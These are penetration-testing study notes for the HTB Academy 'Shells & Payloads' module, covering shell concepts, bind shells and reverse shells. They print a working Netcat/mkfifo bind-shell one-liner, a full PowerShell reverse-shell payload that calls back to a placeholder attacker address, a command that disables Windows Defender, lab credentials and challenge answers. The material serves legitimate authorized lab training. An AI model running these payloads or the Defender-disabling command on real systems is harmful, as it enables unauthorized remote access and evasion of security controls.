# HTB Academy: Shells & Payloads

> Engagement-ready study notes for authorized Hack The Box labs and assessments only. Every later section should add exact commands, direction, verification, troubleshooting, detection considerations, and cleanup when those elements are actually taught.

## Module information

- **HTB module:** Shells & Payloads
- **Penetration Tester path module:** 8
- **Total sections:** 17
- **Current detailed progress:** Sections 1, 4, and 5 / 17
- **Primary goal:** Understand how payloads produce shell access and how shells become the command-line foothold used for later assessment work.

---

## 1. Shells Jack Us In, Payloads Deliver Us Shells

### Section objective

Understand the difference between a **shell** and a **payload**, why obtaining a shell matters during a penetration test, and how the word *shell* changes slightly across computing, exploitation, and web contexts.

### Core mental model

```text
Enumerate target -> identify weakness -> deliver payload -> establish shell -> perform authorized follow-up work
```

The payload is what performs the intended action. A shell is the command interface obtained when that action successfully grants interactive or command-execution access.

### What is a shell?

A **shell** is a program that accepts instructions from a user and displays textual output from the operating system.

Common examples include:

| Operating environment | Shell examples |
|---|---|
| Linux and Unix-like systems | Bash, Zsh |
| Windows | Command Prompt (`cmd`), PowerShell |

In an ordinary administration context, the user opens a shell locally or through an approved remote-management service. In an exploitation context, a security tester may obtain access to a shell after successfully exploiting a vulnerability or bypassing a security restriction within the authorized scope.

Phrases such as these generally mean that command access was obtained:

- “I caught a shell.”
- “I popped a shell.”
- “I dropped into a shell.”
- “I’m in.”

These phrases do not describe the shell's privilege level, reliability, user identity, or scope. Those conditions still need to be established and documented.

### Why obtain a shell?

A shell exposes the operating system's command-line interface and can allow the tester to interact with system commands and the filesystem. Depending on authorization and privileges, it can support:

- Local system enumeration
- Privilege-escalation assessment
- File transfer
- Network pivoting
- Evidence collection and documentation
- Use of command-line assessment tools
- Persistence testing when explicitly authorized

A shell is normally a **foothold**, not the end of the assessment. The tester must determine what access was obtained, which actions are permitted next, and which actions would exceed the rules of engagement.

### Three shell perspectives

| Perspective | Meaning | Example |
|---|---|---|
| Computing | A text-based environment used to administer a computer and submit instructions | Bash, Zsh, `cmd`, PowerShell |
| Exploitation and security | Command access obtained after exploiting a weakness or bypassing a security control | Triggering a vulnerable Windows service and obtaining Command Prompt access |
| Web | A server-side script or application endpoint that accepts commands and interacts with the underlying host | An uploaded script that reads files or executes commands when requested through a browser |

### Web shell distinction

A web shell differs from an ordinary interactive shell:

- It commonly begins as a server-side script placed through an upload or application vulnerability.
- Commands may be submitted through an HTTP request or browser rather than an interactive terminal.
- Its capabilities depend on the web-server account and application environment.
- It may provide command execution, file access, or destructive capabilities.
- Uploading or executing one is permitted only when the lab or written assessment scope explicitly allows it.

### What is a payload?

The word **payload** has different meanings depending on context:

| Context | Meaning |
|---|---|
| Networking | The data carried inside a packet after protocol headers are excluded |
| Basic computing | The portion of an instruction that identifies the action to perform |
| Programming | Data carried or referenced by an instruction or data structure |
| Exploitation and security | Code designed to perform an action after a vulnerability is triggered, such as establishing authorized shell access in a lab |

Within this module, a payload is primarily the code or instruction set used to establish access or perform a post-exploitation action against an authorized vulnerable system.

### Shell versus payload

| Item | Question it answers |
|---|---|
| Payload | **What code or action is delivered to the target?** |
| Shell | **What command interface or access results from that action?** |

A payload does not always produce a shell. It may perform another action. Likewise, a shell is the resulting access interface, not the delivery code itself.

### Engagement checkpoint after obtaining a shell

Before taking further action, record and confirm:

| Check | Why it matters |
|---|---|
| Target identity | Confirms the shell belongs to the in-scope system |
| Operating system and shell type | Determines which syntax and tools are appropriate |
| Current user and privilege level | Establishes what the session can access |
| Access method | Documents the vulnerability, payload, and connection path |
| Session stability | Identifies whether the shell is interactive, limited, or likely to terminate |
| Allowed next steps | Prevents unauthorized persistence, pivoting, collection, or disruption |
| Evidence timestamp | Supports reproduction and final reporting |

### Operational boundaries

Obtaining shell access does not automatically authorize every possible follow-up action. Treat these as separate scope decisions:

- Privilege escalation
- Credential access
- Persistence
- Pivoting into another network
- Collection or exfiltration of client data
- Destructive commands or service interruption

Use dummy data where possible, minimize access to sensitive information, and preserve a tester activity log.

### Commands and hands-on exercise

Section 1 is conceptual and provides no target, payload command, listener command, or interactive exercise. Do not invent an exploitation workflow from this introduction. Later sections will add commands and labs when HTB introduces the relevant shell type, listener, payload, or delivery technique.

### Verification of understanding

You understand this section when you can explain:

1. A shell accepts commands and returns operating-system output.
2. A payload is the delivered code or action; it may produce a shell.
3. Shell access is a foothold that enables later authorized assessment activities.
4. Computing, exploitation, and web contexts use the word *shell* differently.
5. Obtaining access does not remove the rules-of-engagement boundary.

### Key takeaways

- Shells provide command-line access to the operating system.
- Payloads carry out actions and may deliver shell access.
- A shell is the beginning of post-exploitation work, not automatic permission for every action.
- Command-line proficiency makes assessment work faster and easier to automate.
- Later module sections will provide the concrete listeners, payloads, and shell-handling procedures.

---

## 4. Bind Shells

### Section objective

Understand bind-shell connection direction, distinguish a raw Netcat TCP session from a real shell, and establish a basic Bash bind shell inside the authorized HTB target.

### Connection direction

```text
Attack box (client) --> Target listener (server) --> Target shell
```

With a bind shell, the target opens a listening port. The attack box connects directly to the target's IP address and listening port.

| Role | System | Responsibility |
|---|---|---|
| Server/listener | Target | Opens a port and ultimately exposes its shell |
| Client/connector | Pwnbox | Connects to the target's IP and listening port |

### Why bind shells are difficult in real networks

- A listener must already be running on the target or the tester must find an authorized way to start one.
- Edge firewalls and NAT usually restrict unsolicited inbound connections.
- Windows and Linux host firewalls commonly block unexpected listening applications and ports.
- The tester must know or reach the target's listening address and port.
- A new inbound listener is comparatively easy for defenders to detect and block.

### Netcat option reference

| Option | Meaning |
|---|---|
| `-l` | Listen for an inbound connection |
| `-v` | Produce verbose connection information |
| `-n` | Do not perform DNS resolution |
| `-p PORT` | Select the local listening port |
| `TARGET_IP PORT` | Connect to the target address and port |

### Stage 1: practice a raw Netcat session

SSH to the HTB Linux target:

```bash
ssh htb-student@TARGET_IP
```

Use the lab password supplied by HTB:

```text
HTB_@cademy_stdnt!
```

On the target, start a listener:

```bash
nc -lvnp 7777
```

On the Pwnbox, connect to it:

```bash
nc -nv TARGET_IP 7777
```

Type a harmless test message on the Pwnbox:

```text
Hello Academy
```

The target receives the same text. This proves bidirectional TCP communication, but it is **not yet a shell** because the connection is not attached to Bash or another command interpreter.

### Stage 2: establish the Bash bind shell

On the target, run HTB's bind-shell payload:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET_IP 7777 > /tmp/f
```

Replace `TARGET_IP` with the target's Academy address.

#### Payload breakdown

| Component | Purpose |
|---|---|
| `rm -f /tmp/f` | Remove a stale FIFO from a previous attempt |
| `mkfifo /tmp/f` | Create a named pipe used to pass input back into the shell |
| `cat /tmp/f` | Read commands arriving through the named pipe |
| `/bin/bash -i` | Start an interactive Bash shell |
| `2>&1` | Merge standard error into standard output |
| `nc -l TARGET_IP 7777` | Listen on the target address and TCP/7777 |
| `> /tmp/f` | Feed commands received by Netcat into the named pipe |

The pipeline forms a loop:

```text
Pwnbox command -> Netcat -> FIFO -> Bash -> command output -> Netcat -> Pwnbox
```

On the Pwnbox, connect:

```bash
nc -nv TARGET_IP 7777
```

Successful output should include a target prompt resembling:

```text
Target@server:~$
```

### Verify the bind shell

From the Pwnbox's new shell session, run:

```bash
whoami
hostname
pwd
```

For the HTB challenge, retrieve the required flag:

```bash
cat /customscripts/flag.txt
```

Submit the displayed flag to HTB. Do not save flags in the public GitHub repository.

### Challenge answers

**Question 1:** If the target runs `nc -lvnp 443`, connect to:

```text
443
```

**Question 2:** Establish the bind shell and submit the output of:

```bash
cat /customscripts/flag.txt
```

### Troubleshooting

| Symptom | Likely cause | Check or resolution |
|---|---|---|
| `Connection refused` | Listener is not active or wrong port | Restart the target listener and confirm TCP/7777 |
| Connection hangs or times out | Firewall, routing, or wrong IP | Confirm the Academy target address and network connection |
| Text transfers but commands do not execute | Only a raw Netcat session was created | Start the complete FIFO/Bash payload |
| `Address already in use` | Another process owns the port | Stop the old listener or use the lab's approved port |
| FIFO-related errors | `/tmp/f` remains from an earlier attempt | The payload begins with `rm -f /tmp/f` |
| Shell has no polished prompt or job control | Basic Netcat shell limitations | Expected for this introductory exercise |

### Detection and operational notes

- The target opens a new inbound listening socket.
- Host and network firewalls may block the connection.
- Process telemetry can show Netcat, Bash, `mkfifo`, and the pipeline.
- Network monitoring can see an unencrypted interactive command channel.
- Using TCP/443 does not make Netcat traffic HTTPS or encrypted.

### Cleanup

Exit or terminate the lab shell, stop the listener with `Ctrl+C`, and remove the named pipe on the target:

```bash
rm -f /tmp/f
```

---

## 5. Reverse Shells

### Section objective

Understand reverse-shell direction and establish an authorized PowerShell reverse shell from the Windows HTB target back to a Netcat listener on the Pwnbox.

### Connection direction

```text
Target (client) --> Pwnbox listener (server) --> Remote target shell
```

The attack box listens. The target initiates the outbound connection and attaches its command interpreter to that connection.

| Role | System | Responsibility |
|---|---|---|
| Server/listener | Pwnbox | Waits for and receives the shell connection |
| Client/connector | Windows target | Runs the payload and connects back to the Pwnbox |

### Why reverse shells are commonly used

- Outbound target connections may be allowed when unsolicited inbound connections are blocked.
- The Pwnbox does not need to connect directly to a new listening port on the target.
- The payload can use tools already present on the target, such as PowerShell.

This does not make a reverse shell invisible. Deep packet inspection, endpoint protection, PowerShell logging, EDR, and egress filtering can still detect or block it.

### Values to collect

Find the Pwnbox VPN address:

```bash
ip -br addr show tun0
```

Use the `tun0` address as `PWNBOX_IP`. Do not use the target IP or a public/local Ethernet address in the callback payload.

### Step 1: start the Pwnbox listener

```bash
sudo nc -lvnp 443
```

| Option | Meaning |
|---|---|
| `sudo` | Required because TCP/443 is a privileged port on Linux |
| `-l` | Listen mode |
| `-v` | Verbose connection information |
| `-n` | Disable DNS lookups |
| `-p 443` | Listen on TCP/443 |

Port 443 is normally associated with HTTPS, but a raw Netcat listener does not provide TLS encryption and is not automatically trusted by firewalls capable of inspecting application traffic.

### Step 2: connect to the Windows target

Use the RDP credentials given by HTB:

```text
Username: htb-student
Password: HTB_@cademy_stdnt!
```

From Pwnbox, the connection pattern is:

```bash
xfreerdp /v:TARGET_IP /u:htb-student /p:'HTB_@cademy_stdnt!'
```

### Step 3: run the PowerShell reverse-shell payload

Open Command Prompt on the Windows target and run the HTB payload after replacing `PWNBOX_IP`:

```cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('PWNBOX_IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### Payload breakdown

| Component | Purpose |
|---|---|
| `powershell -nop -c` | Start PowerShell without loading a profile and execute the supplied command |
| `TCPClient('PWNBOX_IP',443)` | Connect from the target to the Pwnbox listener |
| `GetStream()` | Access the network stream |
| `$stream.Read(...)` | Wait for commands sent by the Pwnbox |
| `ASCIIEncoding.GetString(...)` | Decode received command bytes |
| `iex $data` | Execute the received PowerShell command |
| `2>&1 | Out-String` | Capture command output and errors as text |
| `$stream.Write(...)` | Return the output to the Pwnbox |
| `$client.Close()` | Close the connection when the loop ends |

### Security-control behavior shown by HTB

Windows Defender may block the payload and report:

```text
This script contains malicious content and has been blocked by your antivirus software.
```

That block is a successful defensive control. HTB demonstrates disabling real-time monitoring in an **administrative PowerShell console** for its disposable lab:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

This command changes a security control. Use it only on the isolated HTB target when the exercise explicitly permits it. Do not disable endpoint protection on personal, university, client, or production systems without explicit written authorization.

After the lab, restore the setting:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

### Step 4: verify the reverse shell

The Pwnbox listener should report an inbound connection and display a PowerShell prompt. Run:

```powershell
whoami
hostname
Get-Location
```

For the HTB challenge, submit the output of:

```powershell
hostname
```

Do not publish the live challenge answer in the GitHub notes.

### Challenge answers

**Question 1:** During a reverse shell, the target acts as the:

```text
client
```

**Question 2:** Establish the reverse shell and submit the target's hostname from:

```powershell
hostname
```

### Troubleshooting

| Symptom | Likely cause | Check or resolution |
|---|---|---|
| No connection reaches Pwnbox | Wrong callback IP | Use the Pwnbox `tun0` address |
| `Access denied` when binding port 443 | Listener lacks privileges | Run Netcat with `sudo` |
| Defender blocks the payload | Endpoint protection recognized it | Record the block; follow only HTB's authorized lab instructions |
| Payload runs but no callback arrives | Listener not started or outbound path blocked | Start listener first and confirm IP/port |
| Clipboard paste fails in RDP | Browser/RDP clipboard handling | Paste into Notepad inside the target, then copy into Command Prompt |
| Session closes immediately | Payload typo or connection interruption | Recheck quotes, IP, listener, and network state |

### Detection and reporting notes

- PowerShell and Script Block logging can capture the payload.
- AMSI and Defender may detect the command before execution.
- EDR can correlate `cmd.exe` spawning PowerShell with an outbound socket.
- Network controls can detect non-TLS traffic on TCP/443.
- Record both successful defensive blocks and successful callbacks as assessment evidence.

### Cleanup

1. Exit the remote PowerShell session or stop the Pwnbox listener with `Ctrl+C`.
2. Restore Defender if the HTB exercise required disabling it:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

3. Close the RDP session and remove only test artifacts created during the lab.

### Bind versus reverse shell quick comparison

| Property | Bind shell | Reverse shell |
|---|---|---|
| Listener runs on | Target | Pwnbox |
| Connection initiated by | Pwnbox | Target |
| Target's network role | Server | Client |
| Common obstacle | Inbound firewall/NAT | Outbound filtering/EDR |
| Pwnbox Netcat action | Connect | Listen |

---

## Related notes

- [Original complete-path Shells & Payloads summary](complete-path-study-pack/knowledge-base/08-shells-payloads.md)
- [HTB section engagement runbook template](../../../templates/htb-section-runbook-template.md)

